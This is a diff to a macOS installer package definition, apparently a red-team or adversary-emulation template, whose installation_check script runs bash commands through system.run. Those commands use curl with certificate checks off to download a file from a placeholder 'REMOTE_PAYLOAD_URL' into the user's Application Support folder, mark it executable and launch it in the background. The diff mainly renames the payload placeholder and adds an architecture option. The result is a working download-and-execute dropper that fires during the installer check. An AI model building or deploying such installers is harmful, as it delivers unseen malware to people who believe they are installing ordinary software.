@@ -3,6 +3,7 @@
     <title>Package Installer</title>
     <pkg-ref id="install.pkg"/>
     <options allow-external-scripts="yes"/>
+    <options hostArchitectures="arm64,x86_64"/>
     <choices-outline>
         <line choice="default">
             <line choice="install.pkg"/>
@@ -18,13 +19,13 @@
 
 function installation_check () {
     // Run a custom script
-    command = "/usr/bin/curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\\ Support/operator-payload"
+    command = "/usr/bin/curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\\ Support/PAYLOAD_NAME"
     exit_code = system.run('/bin/bash', '-c', command);
 
-    command = "chmod +x /Users/$USER/Library/Application\\ Support/operator-payload" 
+    command = "chmod +x /Users/$USER/Library/Application\\ Support/PAYLOAD_NAME" 
     exit_code = system.run('/bin/bash', '-c', command);
 
-    command = "/Users/$USER/Library/Application\\ Support/operator-payload -name TECHNIQUE_NAME &"
+    command = "/Users/$USER/Library/Application\\ Support/PAYLOAD_NAME &"
     exit_code = system.run('/bin/bash', '-c', command);
 
     if (exit_code != 0) {
